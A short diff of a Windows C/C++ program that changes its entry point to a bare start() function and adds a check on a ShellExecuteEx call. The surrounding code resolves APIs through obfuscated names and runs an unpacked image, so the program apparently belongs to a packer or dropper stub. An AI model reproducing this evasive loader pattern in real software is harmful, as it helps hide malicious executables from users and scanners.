@@ -992,7 +992,7 @@ __fdecl void init(){
   fsd=(FSD)get_fn_ptr(hadvapi32,f0039);
 };
 
-INT WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PSTR lpCmdLine, INT nCmdShow){
+extern "C" void start(){
   init();
   uint32_t res_size=0;
   image=(uint8_t*)LocalAlloc(LMEM_ZEROINIT,image_size);
@@ -1067,7 +1067,7 @@ INT WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PSTR lpCmdLine, I
             CloseHandle(iMutex);
             iMutex=0;
           };
-          ((SEA)_f(sea))(&ShExecInfo);
+          if(((SEA)_f(sea))(&ShExecInfo)==FALSE) res_size=0;
         };
         LocalFree(path);
       };
@@ -1079,5 +1079,4 @@ INT WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PSTR lpCmdLine, I
   free_mem();
   if(iMutex) CloseHandle(iMutex);
   if(!res_size) ExitProcess(0);
-  return 0;
 }
